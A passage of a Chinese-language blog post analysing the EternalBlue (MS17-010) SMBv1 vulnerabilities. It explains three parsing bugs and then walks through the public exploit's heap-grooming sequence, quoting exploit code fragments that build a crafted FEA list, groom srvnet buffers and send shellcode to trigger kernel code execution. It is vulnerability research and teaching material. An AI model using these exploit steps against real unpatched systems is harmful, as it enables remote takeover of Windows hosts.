ff-fa</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二个：发送SMB_COM_NT_TRANSACT并附带FEA LIST和多个transcation，服务端会通过 SMB_COM_TRANSACTION2_SECONDARY将SMB_COM_NT_TRANSACT作为SMB_COM_TRANSACTION2处理；通过这种方式可以传入FEA LIST大于0xffff大小的数据，因为SMB_COM_NT_TRANSACT长度字段类型为ULONG，而SMB_COM_TRANSACTION2为USHORT类型</strong></p>
+<p>核心问题：对于 transaction类型的校验，只是以最后接收的*_SECONDARY类型为准，因此可以通过SMB_COM_NT_TRANSACT传递payload，并以SMB_COM_TRANSACTION2_SECONDARY结尾，这样就造成了错误解析，将SMB_COM_NT_TRANSACT以SMB_COM_TRANSACTION2类型进行解析</p>
+<p>SMB Message Structure</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># The SMB_Header structure is a fixed 32-bytes in length.</span><br><span class="line">SMB_Header</span><br><span class="line">&#123;</span><br><span class="line">UCHAR Protocol[4];</span><br><span class="line">UCHAR Command;</span><br><span class="line">SMB_ERROR Status;</span><br><span class="line">UCHAR Flags;</span><br><span class="line">USHORT Flags2;</span><br><span class="line">USHORT PIDHigh;</span><br><span class="line">UCHAR SecurityFeatures[8];</span><br><span class="line">USHORT Reserved;</span><br><span class="line">USHORT TID;</span><br><span class="line">USHORT PIDLow;</span><br><span class="line">USHORT UID;</span><br><span class="line">USHORT MID;</span><br><span class="line">&#125;</span><br><span class="line"># SMB_Parameters</span><br><span class="line">&#123;</span><br><span class="line">UCHAR WordCount;</span><br><span class="line">USHORT Words[WordCount] (variable);</span><br><span class="line">&#125;</span><br><span class="line"># SMB_Data</span><br><span class="line">&#123;</span><br><span class="line">USHORT ByteCount;</span><br><span class="line">UCHAR Bytes[ByteCount] (variable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过PID、MID、TID、UID来匹配是否相同，会在服务端将其组装为同一类型trancation</p>
+<p><strong>第三个：在处理 SMB_COM_SESSION_SETUP_ANDX 命令时，会以13类型的请求方式处理12请求的数据；这样既可以稳定控制连续pool内存的申请和释放</strong></p>
+<p>SMB_COM_TREE_CONNECT_ANDX<br>SMB_COM_SESSION_SETUP_ANDX</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># SMB_COM_SESSION_SETUP_ANDX</span><br><span class="line">#  LM and NTLM authentication</span><br><span class="line">#  NT Security request</span><br><span class="line">SMB_Parameters</span><br><span class="line">&#123;</span><br><span class="line">UCHAR WordCount;		// 0xD = 13</span><br><span class="line">Words</span><br><span class="line">&#123;</span><br><span class="line">UCHAR AndXCommand;</span><br><span class="line">UCHAR AndXReserved;</span><br><span class="line">USHORT AndXOffset;</span><br><span class="line">USHORT MaxBufferSize;</span><br><span class="line">USHORT MaxMpxCount;</span><br><span class="line">USHORT VcNumber;</span><br><span class="line">ULONG SessionKey;</span><br><span class="line">USHORT OEMPasswordLen;</span><br><span class="line">USHORT UnicodePasswordLen;</span><br><span class="line">ULONG Reserved;</span><br><span class="line">ULONG Capabilities;</span><br><span class="line">&#125; &#125;</span><br><span class="line">SMB_Data</span><br><span class="line">&#123;</span><br><span class="line">USHORT ByteCount;</span><br><span class="line">Bytes</span><br><span class="line">&#123;</span><br><span class="line">UCHAR OEMPassword[];</span><br><span class="line">UCHAR UnicodePassword[];</span><br><span class="line">UCHAR Pad[];</span><br><span class="line">SMB_STRING AccountName[];</span><br><span class="line">SMB_STRING PrimaryDomain[];</span><br><span class="line">SMB_STRING NativeOS[];</span><br><span class="line">SMB_STRING NativeLanMan[];</span><br><span class="line">&#125; &#125;</span><br><span class="line"></span><br><span class="line"># extended security request</span><br><span class="line"> SMB_Parameters</span><br><span class="line">   &#123;</span><br><span class="line">   UCHAR  WordCount;	// 0xC = 12</span><br><span class="line">   Words</span><br><span class="line">     &#123;</span><br><span class="line">     UCHAR  AndXCommand;</span><br><span class="line">     UCHAR  AndXReserved;</span><br><span class="line">     USHORT AndXOffset;</span><br><span class="line">     USHORT MaxBufferSize;</span><br><span class="line">     USHORT MaxMpxCount;</span><br><span class="line">     USHORT VcNumber;</span><br><span class="line">     ULONG  SessionKey;</span><br><span class="line">     USHORT SecurityBlobLength;</span><br><span class="line">     ULONG  Reserved;</span><br><span class="line">     ULONG  Capabilities;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> SMB_Data</span><br><span class="line">   &#123;</span><br><span class="line">   USHORT ByteCount;</span><br><span class="line">   Bytes</span><br><span class="line">     &#123;</span><br><span class="line">     UCHAR      SecurityBlob[SecurityBlobLength];</span><br><span class="line">     SMB_STRING NativeOS[];</span><br><span class="line">     SMB_STRING NativeLanMan[];</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞函数BlockingSessionSetupAndX伪代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BlockingSessionSetupAndX(request, smbHeader)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// check word count</span></span><br><span class="line">	<span class="keyword">if</span> (! (request-&gt;WordCount == <span class="number">13</span> || (request-&gt;WordCount == <span class="number">12</span> &amp;&amp; (request-&gt;Capablilities &amp; CAP_EXTENDED_SECURITY))) ) &#123;</span><br><span class="line">    <span class="comment">// error and return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">	<span class="keyword">if</span> ((request-&gt;Capablilities &amp; CAP_EXTENDED_SECURITY) &amp;&amp; (smbHeader-&gt;Flags2 &amp; FLAGS2_EXTENDED_SECURITY)) &#123;</span><br><span class="line">    	<span class="comment">// this request is Extend Security request</span></span><br><span class="line">    	GetExtendSecurityParameters(request);  <span class="comment">// extract parameters and data to variables</span></span><br><span class="line">    	SrvValidateSecurityBuffer(request);  <span class="comment">// do authentication</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="comment">// this request is NT Security request</span></span><br><span class="line">    	GetNtSecurityParameters(request);  <span class="comment">// extract parameters and data to variables</span></span><br><span class="line">    	SrvValidateUser(request);  <span class="comment">// do authentication</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发送Extended Security request(12)附带CAP_EXTENDED_SECURITY，并未附带FLAG2_EXTENDED_SECURITY，将该请求伪装成为SMB_COM_SESSION_SETUP_ANDX(13)</p>
+<p>这样就会将请求以NT Security request(13)进行处理，进入函数GetNtSecurityParameters,在该函数中会通过wordcount和bytecount计算申请的内存大小，但12类型和13类型中的bytecount偏移不同，因此当12类型被作为13类型解析时，会解析到SecurityBlob作为bytecount大小</p>
+<p>这里的主要问题是：当设定FLAGS2_EXTENDED_SECURITY和CAP_EXTENDED_SECURITY，则将请求按照Extended Security request(12)处理，否则按照NT Security request(13)进行处理。</p>
+<p>在payload中的利用：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sessionSetup[<span class="string">&#x27;Parameters&#x27;</span>] = smb.SMBSessionSetupAndX_Extended_Parameters()</span><br><span class="line">sessionSetup[<span class="string">&#x27;Data&#x27;</span>] = pack(<span class="string">&#x27;&lt;H&#x27;</span>, reqSize) + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">20</span>	<span class="comment">// 这里最终解析12类型中SMB_Data.Bytes的头两个字节为解析的大小(在13类型中的ByteCount)</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的sessionSetup[‘Data’]即为SMB_Data.Bytes,因此头两个字节就是reqSize</p>
+<p>至此三个漏洞搞明白后，但对于整个漏洞链是如何串起来的还是比较模糊，例如：</p>
+<ul>
+<li>如何利用漏洞1的越界来触发命令执行</li>
+<li>如何利用漏洞2传入FEA LIST，也就是可控的数据用来触发漏洞1</li>
+<li>漏洞3只是进行了Non-Paged pool申请，实现了占坑但没有进行释放，内部布局如何构造</li>
+</ul>
+<h2 id="0x02-越界如何触发命令执行"><a href="#0x02-越界如何触发命令执行" class="headerlink" title="0x02 越界如何触发命令执行"></a>0x02 越界如何触发命令执行</h2><p>为了触发命令执行，这里引出关键数据结构srvnet，其中有2个关键字段：</p>
+<ul>
+<li>MDL(pMDl1): memory descriptor list;将I/O数据写入到指定的MDL指定虚拟地址中，在实际利用中client发送的数据会写入到指定的虚拟地址中，这样就可以传入可控的数据到指定的地址</li>
+<li>pSrvNetWskStruct: 指向SrvNetWskStruct结构体，该结构体中存在一个函数指针HandlerFunction，该函数会在srvnet连接中断时进行调用；那么如果pSrvNetWskStruct指向的结构体是伪造的，那么就可以很顺利的触发命令执行</li>
+</ul>
+<p>这里利用的地址为HAL的heap的固定地址，因为在该段地址是可执行的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xffd00000		# 32位</span><br><span class="line">0xffffffff ffd00000	# 64位</span><br></pre></td></tr></table></figure>
+
+<p>只要能通过越界控制这两个字段就可以了，但如何将srv buff和srvnet buff拼接到一起？</p>
+<h2 id="0x03-如何通过请求触发漏洞"><a href="#0x03-如何通过请求触发漏洞" class="headerlink" title="0x03 如何通过请求触发漏洞"></a>0x03 如何通过请求触发漏洞</h2><p>这里结合exp，来看整个请求流程是如何进行的：</p>
+<p>srv分配：SMBv1数据包可以触发srv的内存申请，类型为paged或者non-paged pool</p>
+<p>srvnet分配： SMBv2数据包可以触发srvnet的内存申请，类型为paged或者non-paged pool</p>
+<p>一、发送fealist分配srv：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">send_big_trans2(conn, tid, 0, feaList, &#x27;\x00&#x27;*30, 2000, False)</span><br></pre></td></tr></table></figure>
+
+<p>这里利用了漏洞2并且保留最后的fragment不发送，其中fealist的内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NTFEA_SIZE = 0x11000</span><br><span class="line">ntfea11000 = (pack(&#x27;&lt;BBH&#x27;, 0, 0, 0) + &#x27;\x00&#x27;)*600  # 这里对应的ntfea size是0x1c20，因为每一条fea记录转化为NTfea时都会增加5个字节</span><br><span class="line">ntfea11000 += pack(&#x27;&lt;BBH&#x27;, 0, 0, 0xf3bd) + &#x27;A&#x27;*0xf3be  # 0x10fe8 - 0x1c20 - 0xc = 0xf3bc</span><br><span class="line">ntfea = &#123; 0x10000 : ntfea10000, 0x11000 : ntfea11000 &#125;</span><br><span class="line">feaList = pack(&#x27;&lt;I&#x27;, 0x10000)</span><br><span class="line">feaList += ntfea[NTFEA_SIZE]</span><br><span class="line">feaList += pack(&#x27;&lt;BBH&#x27;, 0, 0, len(fakeSrvNetBuffer)-1) + fakeSrvNetBuffer	# 需要越界覆盖的东西</span><br><span class="line">feaList += pack(&#x27;&lt;BBH&#x27;, 0x12, 0x34, 0x5678) # 无效的记录，会触发转换异常</span><br></pre></td></tr></table></figure>
+
+<p>这里对应的fealist的结构体如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _FEA &#123;   /* fea */</span><br><span class="line">    BYTE fEA;        /* flags*/</span><br><span class="line">    BYTE cbName;     /* name length not including NULL */</span><br><span class="line">    USHORT cbValue;  /* value length */</span><br><span class="line">&#125; FEA, *PFEA;</span><br><span class="line"> </span><br><span class="line">typedef struct _FEALIST &#123;    /* fealist */</span><br><span class="line">    DWORD cbList;   /* total bytes of structure including full list */</span><br><span class="line">    FEA list[1];    /* variable length FEA structures */</span><br><span class="line">&#125; FEALIST, *PFEALIST;</span><br></pre></td></tr></table></figure>
+
+<p>二、利用bug3申请大小为：<code>NTFEA_SIZE-0x1010</code>的non-paged pool内存</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x1010)</span><br></pre></td></tr></table></figure>
+
+<p>这块内存的申请是为了确保后续NTFEA的内存可以与srvnet相邻</p>
+<p>三、申请多个srvnet进行占坑：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">srvnetConn = []</span><br><span class="line">for i in range(numGroomConn):</span><br><span class="line">	sk = createConnectionWithBigSMBFirst80(target)</span><br><span class="line">	srvnetConn.append(sk)</span><br></pre></td></tr></table></figure>
+
+<p>四、利用bug3申请大小为：<code>NTFEA_SIZE-0x10</code>的non-paged pool内存</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">holeConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x10)</span><br></pre></td></tr></table></figure>
+
+<p>这块内存是用来确保NTFEA使用，接着让srvnet与这块内存相邻即可</p>
+<p>五、释放第二步申请的内存，这样可以确保临时申请的一些小内存不会直接添加到holeConn后面，阻碍srvnet的占用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allocConn.get_socket().close()</span><br></pre></td></tr></table></figure>
+
+<p>六、申请srvnet，仅靠holeConn：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in range(5):</span><br><span class="line">	sk = createConnectionWithBigSMBFirst80(target)</span><br><span class="line">	srvnetConn.append(sk)</span><br></pre></td></tr></table></figure>
+
+<p>这里申请多个，只有一个可以仅靠holeConn，那么就算是成功了</p>
+<p>七、此时内存布局基本完成，释放holeConn，准备触发整个漏洞链</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">holeConn.get_socket().close()</span><br></pre></td></tr></table></figure>
+
+<p>八、发送fealist最后一个fragment，此时会触发bug1的越界操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">send_trans2_second(conn, tid, feaList[progress:], progress)</span><br></pre></td></tr></table></figure>
+
+<p>这里通过响应来判断是否发生越界，因为构造的fealist最后一条记录是非法记录，转换肯定会报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">recvPkt = conn.recvSMB()</span><br><span class="line">retStatus = recvPkt.getNTStatus()</span><br><span class="line"># retStatus MUST be 0xc000000d (INVALID_PARAMETER) because of invalid fea flag</span><br><span class="line">if retStatus == 0xc000000d:</span><br><span class="line">	print(&#x27;good response status: INVALID_PARAMETER&#x27;)</span><br><span class="line">else:</span><br><span class="line">	print(&#x27;bad response status: 0x&#123;:08x&#125;&#x27;.format(retStatus))</span><br></pre></td></tr></table></figure>
+
+<p>九、完成了越界后，借助srvnet覆盖后的MDL，向HAL’s heap地址传入shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for sk in srvnetConn:</span><br><span class="line">	sk.send(fake_recv_struct + shellcode)</span><br></pre></td></tr></table></figure>
+
+<p>十、最后断开链接触发命令执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for sk in srvnetConn:</span><br><span class="line">	sk.close()</span><br></pre></td></tr></table></figure>
+
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/worawit/MS17-010/blob/master/eternalblue_exploit7.py">https://github.com/worawit/MS17-010/blob/master/eternalblue_exploit7.py</a><br><a target="_blank" rel="noopener" href="https://www.slideshare.net/cisoplatform7/demystifying-ms17010-reverse-engineering-the-eternal-exploits">https://www.slideshare.net/cisoplatform7/demystifying-ms17010-reverse-engineering-the-eternal-exploits</a></p>
+<p><a target="_blank" rel="noopener" href="https://yi0934.github.io/2019/04/08/CVE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ms17-010/">https://yi0934.github.io/2019/04/08/CVE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ms17-010/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/87168">https://www.anquanke.com/post/id/87168</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/280/">https://paper.seebug.org/280/</a> </p>
+<p><a target="_blank" rel="noopener" href="https://research.checkpoint.com/2017/eternalblue-everything-know/">https://research.checkpoint.com/2017/eternalblue-everything-know/</a> </p>
+<p><a target="_blank" rel="noopener" href="https://blog.trendmicro.com/trendlabs-security-intelligence/ms17-010-eternalblue/">https://blog.trendmicro.com/trendlabs-security-intelligence/ms17-010-eternalblue/</a> </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/3ndG4me/AutoBlue-MS17-010/">https://github.com/3ndG4me/AutoBlue-MS17-010/</a> </p>
+<p><a target="_blank" rel="noopener" href="https://www.schauer.fr/wp-content/uploads/2018/02/msrpc_null_sessions.pdf">https://www.schauer.fr/wp-content/uploads/2018/02/msrpc_null_sessions.pdf</a> </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/category/">Category</a></li>
+         
+          <li><a href="/tag/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%85%88%E5%85%B3%E6%B3%A8MS17-010%E4%B8%AD%E4%BD%BF%E7%94%A8%E7%9A%84%E4%B8%89%E4%B8%AA%E5%85%B3%E9%94%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">0x01 先关注MS17-010中使用的三个关键漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E8%B6%8A%E7%95%8C%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.</span> <span class="toc-text">0x02 越界如何触发命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E8%AF%B7%E6%B1%82%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">0x03 如何通过请求触发漏洞</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/03/19/EternalBlue-Vul/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/03/19/EternalBlue-Vul/&text=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/03/19/EternalBlue-Vul/&title=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/03/19/EternalBlue-Vul/&is_video=false&description=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=EternalBlue(MS17-010) 漏洞分析&body=Check out this article: http://example.com/2020/03/19/EternalBlue-Vul/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/03/19/EternalBlue-Vul/&title=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/03/19/EternalBlue-Vul/&title=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/03/19/EternalBlue-Vul/&title=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/03/19/EternalBlue-Vul/&title=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/03/19/EternalBlue-Vul/&name=EternalBlue(MS17-010) 漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/03/19/EternalBlue-Vul/&t=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2017-2022
+    PENCH3R
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/category/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js" crossorigin="anonymous"></script>
+  
+<script src="/js/wrapImage.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
